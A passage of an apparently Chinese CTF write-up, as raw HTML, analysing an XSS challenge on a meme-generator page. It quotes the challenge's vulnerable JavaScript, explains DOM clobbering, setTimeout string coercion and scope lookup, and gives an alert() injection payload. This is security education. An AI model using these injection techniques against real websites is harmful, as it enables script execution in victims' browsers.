class="hljs-string">&quot;status&quot;</span>&gt;</span>`+</span></span></span><br><span class="line"><span class="hljs-actionscript">            `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(img)}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;`+</span></span></span><br><span class="line"><span class="hljs-javascript">            <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">        )</span><br><span class="line"><span class="hljs-actionscript">    } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">        $(<span class="hljs-string">&apos;#meme-code&apos;</span>).text(memeTemplate(<span class="hljs-string">&apos;https://i.imgur.com/PdbDexI.jpg&apos;</span>, <span class="hljs-string">&apos;When you get that WW3 draft letter&apos;</span>))</span></span><br><span class="line">    }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x4E2A;&#x9898;&#x76EE;&#x8BA9;&#x6211;&#x6DF1;&#x6DF1;&#x5730;&#x4F53;&#x4F1A;&#x5230;&#x4E86; JavaScript &#x7684;&#x6076;&#x610F;&#x2026;&#x5148;&#x653E;&#x4E2A;&#x56FE;&#xFF0C;&#x5927;&#x5BB6;&#x81EA;&#x884C;&#x5148;&#x4F53;&#x4F1A;&#x4E00;&#x4E0B;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x5F00;&#x59CB;&#x5206;&#x6790;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x3002;</p><p><img src="https://i.redd.it/rz3o1yibnc511.png" alt></p><p>&#x9898;&#x76EE;&#x7528;&#x6BD4;&#x8F83;&#x591A;&#x7684;&#x4EE3;&#x7801;&#x505A;&#x4E86;&#x4E00;&#x4E2A;&#x83B7;&#x53D6;&#x56FE;&#x7247;&#x4EE5;&#x53CA;&#x8F93;&#x51FA;&#x81EA;&#x5B9A;&#x4E49; text &#x7684;&#x529F;&#x80FD;&#xFF0C;&#x4ECD;&#x65E7;&#x662F;&#x4E0A;&#x9898;&#x7684;&#x56DB;&#x4E2A;&#x5916;&#x90E8; JS &#x6587;&#x4EF6;&#xFF0C;&#x4EE5;&#x53CA;&#x4E00;&#x5927;&#x6BB5; JS &#x4EE3;&#x7801;&#x3002;&#x672C;&#x9898;&#x6D89;&#x53CA;&#x5230; JavaScript &#x6BD4;&#x8F83;&#x591A;&#x7684;&#x9ED1;&#x9B54;&#x6CD5;&#xFF0C;&#x6211;&#x4EEC;&#x4E00;&#x4E2A;&#x4E2A;&#x6765;&#x770B;&#x770B;&#x3002;</p><p>&#x5BA1;&#x8BA1;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x5230;&#x9898;&#x76EE;&#x5B9A;&#x4E49;&#x4E86;&#x51E0;&#x4E2A;&#x51FD;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> <span class="hljs-built_in">escape</span> = <span class="hljs-function"><span class="hljs-params">dirty</span> =&gt;</span> <span class="hljs-built_in">unescape</span>(dirty).replace(<span class="hljs-regexp">/[&lt;&gt;&apos;&quot;=]/g</span>, <span class="hljs-string">&quot;&quot;</span>);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x8FC7;&#x6EE4;&#x6211;&#x4EEC;&#x7684; img &#x53C2;&#x6570;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeTemplate = <span class="hljs-function">(<span class="hljs-params">img, text</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">return</span> (</span><br><span class="line">    <span class="hljs-string">`&lt;style&gt;@import url(&apos;https://fonts.googleapis.com/css?family=Oswald:700&amp;display=swap&apos;);`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card{margin:0 auto;width:300px}.meme-card&gt;img{width:300px}`</span> +</span><br><span class="line">    <span class="hljs-string">`.meme-card&gt;h1{text-align:center;color:#fff;background:black;margin-top:-5px;`</span> +</span><br><span class="line">    <span class="hljs-string">`position:relative;font-family:Oswald,sans-serif;font-weight:700}&lt;/style&gt;`</span> +</span><br><span class="line">    <span class="hljs-string">`&lt;div class=&quot;meme-card&quot;&gt;&lt;img src=&quot;<span class="hljs-subst">${img}</span>&quot;&gt;&lt;h1&gt;<span class="hljs-subst">${text}</span>&lt;/h1&gt;&lt;/div&gt;`</span></span><br><span class="line">  );</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x5C06;&#x6211;&#x4EEC;&#x4F20;&#x5165;&#x7684; img &amp; text &#x53C2;&#x6570;&#x6784;&#x9020;&#x4E00;&#x4E2A; HTML &#x6A21;&#x7248;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (text &amp;&amp; img) {</span><br><span class="line">    template = memeTemplate(img, text);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (notify) {</span><br><span class="line">      html = <span class="hljs-string">`&lt;div class=&quot;alert alert-warning&quot; role=&quot;alert&quot;&gt;&lt;b&gt;Meme&lt;/b&gt; created from <span class="hljs-subst">${DOMPurify.sanitize(</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">        text</span></span></span><br><span class="line"><span class="hljs-string"><span class="hljs-subst">      )}</span>&lt;/div&gt;`</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    setTimeout(<span class="hljs-function"><span class="hljs-params">_</span> =&gt;</span> {</span><br><span class="line">      $(<span class="hljs-string">&quot;#status&quot;</span>).remove();</span><br><span class="line">      notify ? $(<span class="hljs-string">&quot;#notify&quot;</span>).html(html) : <span class="hljs-string">&quot;&quot;</span>;</span><br><span class="line">      $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(template);</span><br><span class="line">    }, <span class="hljs-number">1000</span>);</span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7528;&#x6765;&#x8FDB;&#x884C; DOM &#x5143;&#x7D20;&#x64CD;&#x4F5C;&#x7B49;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x6211;&#x4EEC;&#x7684;&#x76EE;&#x6807;&#x5C31;&#x662F;<code>setTimeout</code>&#x51FD;&#x6570;&#x4E2D;&#x901A;&#x8FC7;<code>$(&quot;#notify&quot;).html(html)</code>&#x6765;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x80FD;&#x9700;&#x8981;&#x60F3;&#x529E;&#x6CD5;&#x628A; notify &#x53C2;&#x6570;&#x8BBE;&#x7F6E;&#x4E3A; true&#x3002;</p><h3 id="DOM-Clobbering"><a href="#DOM-Clobbering" class="headerlink" title="DOM Clobbering"></a>DOM Clobbering</h3><p>&#x9996;&#x5148;&#x6211;&#x4EEC;&#x5148;&#x6765;&#x770B;&#x770B;&#x51E0;&#x4E2A;&#x6BD4;&#x8F83;&#x6709;&#x8DA3;&#x7684;&#x4F8B;&#x5B50;&#xFF1A;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201223309.png" alt></p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;</p><blockquote><p>&#x200B;    The <strong><code>domain</code></strong> property of the <a href="https://developer.mozilla.org/en-US/docs/Web/API/Document" target="_blank" rel="noopener"><code>Document</code></a> interface gets/sets the domain portion of the origin of the current document, as used by the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener">same origin policy</a>.</p></blockquote><p>&#x8FD9;&#x91CC;&#x7684;<code>document.domain</code>&#x5E76;&#x6CA1;&#x6709;&#x83B7;&#x53D6;&#x5230;&#x6211;&#x7684;&#x57DF;&#x540D;<code>zedd.vv</code>&#xFF0C;&#x53CD;&#x800C;&#x662F;&#x83B7;&#x53D6;&#x5230;&#x4E86; img &#x6807;&#x7B7E;&#xFF0C;&#x7136;&#x540E;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8F93;&#x51FA; document &#x5BF9;&#x8C61;&#x6765;&#x770B;&#x770B;&#x662F;&#x600E;&#x4E48;&#x56DE;&#x4E8B;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224629.png" alt></p><p>&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x4F8B;&#x5B50;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#xFF0C;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E9B;&#x6807;&#x7B7E;&#x7684; id(name) &#x5C5E;&#x6027;&#x6765;&#x63A7;&#x5236; document(window) &#x901A;&#x8FC7; DOM API(BOM API) &#x83B7;&#x53D6;&#x5230;&#x7684;&#x67D0;&#x4E2A;&#x4E1C;&#x897F;</p><p><img src="https://zeddyuimg.oss-cn-shanghai.aliyuncs.com/20200201224817.png" alt></p><p>&#x6211;&#x67E5;&#x9605;&#x8FC7;&#x76F8;&#x5173;&#x8D44;&#x6599;&#xFF0C;&#x4E5F;&#x8BE2;&#x95EE;&#x8FC7;&#x4E00;&#x4E9B;&#x524D;&#x7AEF;&#x7684;&#x4E13;&#x4E1A;&#x4EBA;&#x5458;&#xFF0C;&#x8FD9;&#x91CC;&#x7ED9;&#x6211;&#x7684;&#x89E3;&#x91CA;&#x662F;&#x201D;document &#x548C; window &#x4E24;&#x4E2A;&#x53D8;&#x91CF;&#xFF0C;&#x5176;&#x5B9E;&#x662F; DOM &#x548C; BOM &#x7684;&#x89C4;&#x8303;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x8FD9;&#x4E24;&#x4E2A;&#x4E0D;&#x5E94;&#x8BE5;&#x88AB;&#x5F53;&#x505A;&#x666E;&#x901A;&#x7684; JS &#x5BF9;&#x8C61;&#xFF0C;&#x4F46;&#x662F;&#x89C4;&#x8303;&#x4E0E;&#x5B9E;&#x73B0;&#x4E0D;&#x540C;&#x201D;&#xFF0C;&#x201D;&#x90FD;&#x662F;&#x56E0;&#x4E3A;&#x4E0A;&#x53E4;&#x9057;&#x7559;&#x95EE;&#x9898;&#xFF0C;&#x73B0;&#x5728;&#x54EA;&#x6709;&#x76F4;&#x63A5;&#x5199; document.xxx &#x6765;&#x83B7;&#x53D6;&#x5143;&#x7D20;&#x7684;&#xFF0C;TS &#x548C; eslint &#x90FD;&#x4F1A;&#x62A5;&#x9519;&#x201D;&#x3002;</p><p>&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#x5177;&#x4F53;&#x53EF;&#x4EE5;&#x53C2;&#x8003; <a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">dom-clobbering</a>&#xFF0C;&#x4E0D;&#x7B97;&#x662F;&#x65B0;&#x7684;&#x653B;&#x51FB;&#x624B;&#x6CD5;&#xFF0C;&#x4F46;&#x662F;&#x6709;&#x6548;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528;&#x8FD9;&#x79CD; Trick &#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x64CD;&#x4F5C;&#x3002;</p><h3 id="setTimeout"><a href="#setTimeout" class="headerlink" title="setTimeout"></a>setTimeout</h3><p>&#x6211;&#x4EEC;&#x4E86;&#x89E3;&#x4E86; Dom Clobbering &#x4E4B;&#x540E;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5148;&#x770B;&#x770B;&#x53EF;&#x4EE5;&#x600E;&#x4E48;&#x901A;&#x8FC7;<code>setTimeout</code>&#x6765;&#x5229;&#x7528;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">    a.innerHTML = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&apos;b&apos;</span>);</span></span><br><span class="line">    setTimeout(ok, 2000)</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x7B80;&#x5316;&#x4E86;&#x4E00;&#x4E0B;&#x9898;&#x76EE;&#x4EE3;&#x7801;&#xFF0C;&#x5BF9;&#x4E8E;&#x4EE5;&#x4E0A;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5229;&#x7528; Dom Clobbering &#x6765;&#x5B9E;&#x73B0; XSS &#xFF0C;&#x56E0;&#x4E3A;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4F20;&#x5165; id &#x4E3A; ok &#x7684;&#x6807;&#x7B7E;&#x8FDB;&#x884C; XSS &#xFF0C;&#x4F8B;&#x5982;&#x4F20;&#x5165;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">id</span>=<span class="hljs-string">ok</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert()</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x662F;&#x4E3A;&#x4EC0;&#x4E48;&#x5462;&#xFF1F;</p><p>&#x6839;&#x636E; MDN &#x6587;&#x6863;&#xFF0C;<code>setTimeout</code>&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#x6216;&#x5B57;&#x7B26;&#x4E32;&#x3002;&#x53EF;&#x662F;&#x6839;&#x636E; Dom Clobbering &#xFF0C;&#x8FD9;&#x91CC;&#x7684;<code>ok</code>&#x5E94;&#x8BE5;&#x662F;&#x4E00;&#x4E2A; a &#x6807;&#x7B7E;&#xFF0C;&#x65E2;&#x7136;&#x8FD9;&#x4E0D;&#x662F;&#x4E2A;&#x51FD;&#x6570;&#xFF0C;&#x5B83;&#x5C31;&#x5C1D;&#x8BD5;&#x7528;<code>toString</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6210;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x800C;&#x6839;&#x636E; MDN &#x6587;&#x6863; <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></p><blockquote><p>&#x200B;    <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.toString()</code></a></p><p>Returns a <a href="https://developer.mozilla.org/en-US/docs/Web/API/USVString" target="_blank" rel="noopener"><code>USVString</code></a> containing the whole URL. It is a synonym for <a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/href" target="_blank" rel="noopener"><code>HTMLHyperlinkElementUtils.href</code></a>, though it can&#x2019;t be used to modify the value.</p></blockquote><p>&#x800C;&#x5F53; a &#x6807;&#x7B7E;&#x901A;&#x8FC7;<code>toString()</code>&#x65B9;&#x6CD5;&#x8F6C;&#x6362;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5F97;&#x5230;&#x5B83;&#x7684; href &#x5C5E;&#x6027;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;<code>javascript:alert()</code>&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#x4EE3;&#x7801;&#x4E86;&#x3002;</p><h3 id="notify"><a href="#notify" class="headerlink" title="notify"></a>notify</h3><p>&#x597D;&#x4E86;&#xFF0C;&#x56DE;&#x5230;&#x6211;&#x4EEC;&#x7684; notify &#x4E0A;&#xFF0C;&#x867D;&#x7136;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; DOM Clobbering &#x8FDB;&#x884C;&#x201C;&#x6C61;&#x67D3;&#x201D;&#x4E00;&#x4E9B;&#x53C2;&#x6570;&#xFF0C;&#x4F46;&#x662F;&#x9898;&#x76EE;&#x76F4;&#x63A5;&#x89C4;&#x5B9A;&#x4E86;<code>let notify = false</code>&#xFF0C;&#x6D4F;&#x89C8;&#x5668;&#x5F53;&#x7136;&#x4E5F;&#x4E0D;&#x53EF;&#x80FD;&#x5141;&#x8BB8;&#x6211;&#x4EEC;&#x4FEE;&#x6539;&#x670D;&#x52A1;&#x7AEF;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x53EF;&#x600E;&#x4E48;&#x529E;&#xFF1F;</p><p>&#x5176;&#x5B9E;&#x8FD9;&#x91CC;&#x7684; notify &#x6BD4;&#x8F83;&#x5177;&#x6709;&#x8BEF;&#x5BFC;&#x6027;&#xFF0C;&#x6BD4;&#x8F83;&#x50CF; C &#x8BED;&#x8A00;&#x5165;&#x95E8;&#x7684;&#x65F6;&#x5019;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x90E8;&#x5206;&#xFF0C;&#x6211;&#x4EEC;&#x628A;&#x6574;&#x4E2A;&#x4EE3;&#x7801;&#x6539;&#x4E00;&#x4E0B;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, notify</span>) =&gt;</span> {</span></span><br><span class="line">truetruetruetrueif (text &amp;&amp; img) {</span><br><span class="line">truetruetruetruetruetemplate = memeTemplate(img, text);</span><br><span class="line">truetruetruetruetrueif (notify) {</span><br><span class="line"><span class="hljs-actionscript"><span class="hljs-comment">//...</span></span></span><br><span class="line">truetruetruetruetrue}</span><br><span class="line">truetruetruetrue}</span><br><span class="line">truetruetrue};</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-actionscript">  <span class="hljs-comment">/* Main */</span></span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> notify = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> text = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;text&quot;</span>);</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> img = <span class="hljs-keyword">new</span> URL(location).searchParams.get(<span class="hljs-string">&quot;img&quot;</span>);</span></span><br><span class="line">  if (text &amp;&amp; img) {</span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">document</span>.write(</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">      `<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;alert alert-primary&quot;</span> <span class="hljs-attr">role</span>=<span class="hljs-string">&quot;alert&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;status&quot;</span>&gt;</span>` +</span></span></span><br><span class="line"><span class="hljs-actionscript">      `&lt;img <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">circle</span>&quot; <span class="hljs-title">src</span>=&quot;$</span>{escape(</span></span><br><span class="line">        img</span><br><span class="line"><span class="hljs-actionscript">      )}<span class="hljs-string">&quot; onload=&quot;</span>memeGen(<span class="hljs-keyword">this</span>, notify)<span class="hljs-string">&quot;&gt;` +</span></span></span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-string">`Creating meme... (<span class="hljs-subst">${DOMPurify.sanitize(text)}</span>)&lt;/div&gt;`</span></span></span><br><span class="line">    );</span><br><span class="line"><span class="hljs-actionscript">  } <span class="hljs-keyword">else</span> {</span></span><br><span class="line"><span class="hljs-javascript">    $(<span class="hljs-string">&quot;#meme-code&quot;</span>).text(</span></span><br><span class="line">      memeTemplate(</span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;https://i.imgur.com/PdbDexI.jpg&quot;</span>,</span></span><br><span class="line"><span class="hljs-actionscript">        <span class="hljs-string">&quot;When you get that WW3 draft letter&quot;</span></span></span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">  }</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x518D;&#x7B80;&#x5316;&#x4E00;&#x4E0B;&#x5C31;&#x6210;&#x4E86;&#x6211;&#x4EEC;&#x7684; C &#x8BED;&#x8A00;&#x51FD;&#x6570;&#x4F20;&#x53C2;&#x7684;&#x7EC3;&#x4E60;&#x9898;&#x4E86;</p><p></p><figure class="highlight javascript hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">const</span> memeGen = <span class="hljs-function">(<span class="hljs-params">that, x</span>) =&gt;</span> {</span><br><span class="line">  <span class="hljs-keyword">if</span> (x) {</span><br><span class="line">    <span class="hljs-comment">//...</span></span><br><span class="line">  }</span><br><span class="line">};</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x4E3A;&#x4E86;&#x6613;&#x4E8E;&#x7406;&#x89E3;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x5199;&#x6210;&#x8FD9;&#x6837;&#x5C31;&#x4E0D;&#x6613;&#x5F04;&#x6DF7;&#x4E86;&#xFF0C;&#x6240;&#x4EE5;&#xFF0C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x6765;&#x8BF4;&#xFF0C;<code>notify</code>&#x53EA;&#x662F;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x540D;&#xFF0C;&#x533A;&#x522B;&#x4E8E;&#x6211;&#x4EEC;&#x4E00;&#x5F00;&#x59CB;&#x63D0;&#x5230;&#x7684; Javascript Scope &#x90E8;&#x5206;&#xFF0C;&#x8BE5;&#x51FD;&#x6570;&#x5185;&#x7684;<code>notify</code>&#x53C2;&#x6570;&#x53D8;&#x91CF;&#x53D6;&#x51B3;&#x4E8E;&#x8BE5;&#x51FD;&#x6570;&#x6240;&#x5728;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x3002;</p><p>&#x800C;&#x5BF9;&#x4E8E;<code>memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5B83;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F;&#x5728;<code>let notify = false</code>&#x6240;&#x5904;&#x7684; JS &#x4EE3;&#x7801;&#x57DF;&#x5F53;&#x4E2D;&#xFF0C;&#x800C;&#x662F;&#x5728;&#x901A;&#x8FC7;<code>document.write</code>&#x51FD;&#x6570;&#x4E4B;&#x540E;&#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5C31;&#x6D89;&#x53CA;&#x5230;&#x4E86;&#x4F5C;&#x7528;&#x57DF;&#x7684;&#x95EE;&#x9898;&#x3002;</p><h3 id="JavaScript-Scope"><a href="#JavaScript-Scope" class="headerlink" title="JavaScript Scope"></a>JavaScript Scope</h3><p>&#x6240;&#x4EE5;&#x5BF9;&#x4E8E;&#x6267;&#x884C;<code>document.write</code>&#x51FD;&#x6570;&#x8FC7;&#x540E;&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x5BF9;&#x4E8E;<code>onload=memeGen</code>&#x51FD;&#x6570;&#x6765;&#x8BF4;&#xFF0C;&#x5176;&#x4F5C;&#x7528;&#x57DF;&#x5E76;&#x975E;&#x662F; JS &#x7684;&#x4F5C;&#x7528;&#x57DF;&#xFF0C;&#x5728;&#x9898;&#x76EE;&#x4E2D;&#x672C;&#x6765;&#x8FD9;&#x4E48;&#x51E0;&#x4E2A;&#x4F5C;&#x7528;&#x57DF;&#xFF1A;window&#x3001;script&#x3001;onload&#xFF0C;&#x5176;&#x4E2D; window &#x5305;&#x542B;&#x4E86;&#x540E;&#x4E24;&#x4E2A;&#xFF0C;&#x540E;&#x4E24;&#x4E2A;&#x4E92;&#x4E0D;&#x5305;&#x542B;&#xFF0C;&#x6240;&#x4EE5;&#x8FD9;&#x91CC;&#x5728; onload &#x627E;&#x4E0D;&#x5230; notify &#x53D8;&#x91CF;&#xFF0C;&#x5C31;&#x4F1A;&#x53BB; window &#x7684;&#x4F5C;&#x7528;&#x57DF;&#x627E;&#xFF0C;&#x5C31;&#x4F1A;&#x628A; script &#x4F5C;&#x7528;&#x57DF;&#x5F53;&#x4E2D;&#x7684; notify &#x7ED9;&#x627E;&#x5230;&#xFF0C;notify &#x53D8;&#x91CF;&#x4E5F;&#x5C31;&#x6210; false &#x4E86;&#x3002;</p><p>&#x6211;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x6765;&#x7406;&#x89E3;&#xFF1A;</p><p></p><figure class="highlight html hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">name</span>=<span class="hljs-string">x</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">const</span> test = <span class="hljs-function">(<span class="hljs-params">that,x</span>) =&gt;</span> {</span></span><br><span class="line"><span class="hljs-javascript">    <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;Test&apos;x: &quot;</span> + x);</span></span><br><span class="line">    if(x){</span><br><span class="line"><span class="hljs-javascript">      <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS Magic&quot;</span>);</span></span><br><span class="line">    }</span><br><span class="line">  };</span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-keyword">let</span> x = <span class="hljs-literal">false</span>;</span></span><br><span class="line"><span class="hljs-javascript">  <span class="hljs-built_in">console</span>.log(<span class="hljs-string">&quot;JS&apos;x: &quot;</span> + x);</span></span><br><span class="line"><span class="hljs-handlebars"><span class="hljs-xml">  document.write(&quot;<span class="hljs-tag">&lt;<span 